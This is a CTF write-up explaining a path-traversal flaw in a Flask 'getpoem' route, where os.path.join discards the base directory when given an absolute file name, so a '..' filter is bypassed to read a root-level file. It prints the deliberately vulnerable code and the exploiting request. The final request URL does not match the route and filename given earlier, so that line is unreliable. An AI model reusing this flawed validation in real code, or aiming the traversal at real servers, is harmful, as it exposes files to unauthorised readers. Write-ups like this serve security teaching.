# UIUCTF 2020  
## security_question

Writeup by **ranguli**

Challenge by **Husinocostan**

_Someone just asked a very interesting question online. Can you help them
solve their problem?_

The challenge link `https://security.chal.uiuc.tf/` brings us to a fake  
StackOverflow page with the poster complaining that their friend was able to  
access the `hidden_poem.txt` file in the root directory (`/`) on the server.
They post the following code snippet looking for help:

```python  
@app.route('/getpoem')  
def get_poem():  
   poemname = request.args.get('name')

   if not poemname:  
       return 'Please send a name query:\n' + str(os.listdir('poems')), 404

   poemdir     = os.path.join(os.getcwd(), 'poems')  
   poempath    = os.path.join(poemdir, poemname)

   if '..' in poemname:  
       return 'Illegal substring detected.', 403

   if not os.path.exists(poempath):  
       return 'File not found.', 404

   return send_file(poempath)  
```

In this Python code we see a route defined `/getpoem` assigned to the
`get_poem()` function.

```  
@app.route('/getpoem')  
```  
We also see `poemname` being assigned as query parameter.

```  
poemname = request.args.get('name')  
```

If we try the endpoint `https://security.chal.uiuc.tf/getpoem?name` we get the
following response:

```  
Please send a name query: ['rise.txt', 'daddy.txt', 'tyger.txt', 'road.txt']  
```

The Python code that causes the trouble here is in the joining of paths.

```  
poemdir     = os.path.join(os.getcwd(), 'poems')  
poempath    = os.path.join(poemdir, poemname)  
```

In the 2nd line we see that the `poemdir` directory and `poemname` file are  
being joined to created a path. If we evalute this line of code in a REPL, we  
get the following:

```  
>>> import os  
>>> poemdir = os.path.join(os.getcwd(), 'poems')  
>>> poemdir  
'/home/user/poems'  
```

We know that `poemdir` is the `poems` subdirectory inside the current working
directory. Keep in mind that our interest is in the root `/` directory to get
`hidden_poem.txt`. Another join is performed is the name of the file.

```  
>>> poemname = "poem.txt"  
>>> poempath = os.path.join(poemdir, poemname)  
>> poempath  
'/home/user/poems/poem.txt'  
```

Because of the way that `os.path.join()` works, if we set `poemname` to
`/hidden_poem.txt`, we won't get:

```  
/home/user/poems//hidden_poem.txt  
```

Instead we'll actually just get:

```  
/hidden_poem.txt  
```

Which is the path we want. We can try passing this in as the query parameter:

`https://security.chal.uiuc.tf/getpoem/name?=/hiddenpoem.txt`

And we get the flag!

```  
uiuctf{str_join_is_weird_in_python_3}  
```

**Original writeup here:**
[https://github.com/ranguli/writeups/blob/master/uiuctf/2020/security_question.md](https://github.com/ranguli/writeups/blob/master/uiuctf/2020/security_question.md)  

Original writeup
(https://github.com/ranguli/writeups/blob/master/uiuctf/2020/security_question.md).